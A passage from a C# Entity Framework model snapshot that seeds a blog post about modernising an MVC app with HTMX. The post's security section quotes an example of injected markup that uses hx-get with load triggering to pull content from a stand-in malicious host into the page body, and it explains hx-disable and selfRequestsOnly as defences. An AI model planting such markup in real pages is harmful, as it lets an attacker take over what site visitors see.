htmlBody = sanitizer.Sanitize(item.Description ?? \"\"); <span class=\"nt\">&lt;div&gt;</span> @Html.Raw(htmlBody) <span class=\"nt\">&lt;/div&gt;</span> } ... </code></pre></div></div> <p>In short, anywhere you’re doing the equilivant of razor’s <code class=\"language-plaintext highlighter-rouge\">@Html.Raw()</code> use a reliable and battle-tested sanitizer, but this has always been the case. The truth is, HTMX introduces some new ways to cause mischeif that a sanitizer might not know about. For example, if I had a remote server with no CORS checking, I could inject some poison markup along the lines of <code class=\"language-plaintext highlighter-rouge\">&lt;span hx-get=\"http://malicious.example.com/page\" hx-target=\"body\" hx-trigger=\"load\"&gt;...</code>. The solution is simple. For any content I don’t control/trust that I would output with <code class=\"language-plaintext highlighter-rouge\">@Html.Raw</code> I simply add the <code class=\"language-plaintext highlighter-rouge\">hx-disable</code> attribute in the container along with my raw (but sanitized) html output.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... @if (item.HistoryType == HistoryType.Email) { var htmlBody = sanitizer.Sanitize(item.Description ?? \"\"); <span class=\"nt\">&lt;div</span> <span class=\"na\">hx-disable=</span><span class=\"s\">\"true\"</span><span class=\"nt\">&gt;</span> @Html.Raw(htmlBody) <span class=\"nt\">&lt;/div&gt;</span> } ... </code></pre></div></div> <p>In most cases you will also want to set <code class=\"language-plaintext highlighter-rouge\">htmx.config.selfRequestsOnly</code> to true which will only allow AJAX requests to the same domain as the current document.</p> <h2 id=\"conclusions\">Conclusions</h2> <p>Teaching an old dog (Mago) new (UX) tricks has been an enlightening experience. Once I was able to get over the hurdle of my existing webdev mental set, I found working with HTMX to be an utterly plesant experience. Furthermore, I was able to take a very incremental approach. Once the dashboard conversion was complete I was able to deploy to production. In other words, I delivered value and improvements to my customers after just a couple of hours.</p> <p>I will say this experience also provided some illuminating hindsight. When I first wrote Mago, I didn’t know everything I know today. I have a much better understanding of the REST architectural style and would have made significantly different architectural decisions but it was nice that I didn’t have redesign the entire app to get the UX I (and my customers) wanted. Perhaps I will write more in the future on <em>architecting</em> hypermedia systems, but for now I’m happy with this experience and what I learned. If you want a philosophical deep-dive and don’t want to wait on my uneven blog publication schedule, read the collection of HTMX community <a href=\"https://htmx.org/essays/\">essays.</a></p> <p>In short, to me HTMX is a long overdue breath of fresh air. Do I think HTMX will (or should) replace the mainstream frameworks? Absolutely not. There are many situations where they are absolutely the correct choice. Not only for those situations were a 90s style fat-client app is a better solution but also for those whose core webdev skillset is framework/js ecosystem focused (although if you want a similarly hypermedia-friendly approach but are coming from a typescript/jsx background, check out <a href=\"https://fresh.deno.dev/\">fresh</a>). I belive HTMX is an excellent choice for modernizing legacy MVC applications, for projects driven by teams who are predominantly backend-developers and for whom the complexity and learning curve of a mainstream framework would be an undue burden, and for projects that crave that modern UX but don’t want the complexity that comes with the framework-centric approach. Most notably, migrating Mago to HTMX took a few days. Rewriting in Angular, Vue, or React would have taken considerably longer and introduced a much higher maintenance burden as these frameworks continue to evolve.</p> <p>It’s also worth noting that HTMX does play well with many js libraries and frameworks. Despite the stigma, jQuery remains ubiquitous and useful with a large number of UI plugins and component libraries available. A marriage of jQuery and HTMX is a match made in heaven when jQuery handles the UI components and HTMX handles the dynamic interactivity. AlpineJS is worth a look into and VanillaJS is another good option. HTMX promotes hyperscript as an alternative front-end scripting approach. Finally it’s entirely possible to bring in some vue, react, or even angular if it made sense. Just remember (from the official HTMX docs and essays):</p> <ul> <li><a href=\"https://htmx.org/essays/hypermedia-friendly-scripting#prime_directive\">Respect HATEOAS</a></li> <li><a href=\"https://htmx.org/essays/hypermedia-friendly-scripting#events\">Use events to communicate between components</a></li> <li><a href=\"https://htmx.org/essays/hypermedia-friendly-scripting/#islands\">Use islands to isolate non-hypermedia components from the rest of your application</a></li> <li><a href=\"https://htmx.org/essays/hypermedia-friendly-scripting#inline\">Consider inline scripting</a></li> </ul> <p>I built my first web page using html 2.0 and the past two decades have led me to walk away from most webdev. HTMX has rekindled my love of the web. It’s definitely a technology that should be both on your radar and in your toolkit.</p>",
                            Description = "This post picks up from part I which broadly tells the story of where we are currently and how we got here; ultimately introducing HTMX as the “third way.” It serves as the background and context for this post. If you haven’t already read it, go ahead… I’ll wait. Now that the background is out of the way, let’s look in depth at HTMX. Rather than the usual quickstart or toy examples, we’ll be looking at this in the context of a real production application already in the wild. We’ll modernize a legacy MVC application, examining the UX without and then with HTMX.",
                            FeedId = 1,
                            ImageUrl = "https://sufficiently-advanced.technology/assets/images/htmx-meme.png",
                            IsDeleted = false,
                            IsFavorite = false,
                            IsRead = false,
                            LastUpdated = new DateTime(2024, 1, 30, 17, 0, 0, 0, DateTimeKind.Local),
                            PublishDateTime = new DateTime(2024, 1, 30, 17, 0, 0, 0, DateTimeKind.Local),
                            Title = "Third-Way Web Development Part II - Hypermedia 2.0",
                            Uri = "https://sufficiently-advanced.technology/post/third-way-web-development-part-ii"
                        });
                });

            modelBuilder.Entity("ThirdWay.Data.Model.Post", b =>
                {
                    b.HasOne("ThirdWay.Data.Model.Feed", "Feed")
                        .WithMany()
                        .HasForeignKey("FeedId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("Feed");
                });
#pragma warning restore 612, 618
        }
    }
}
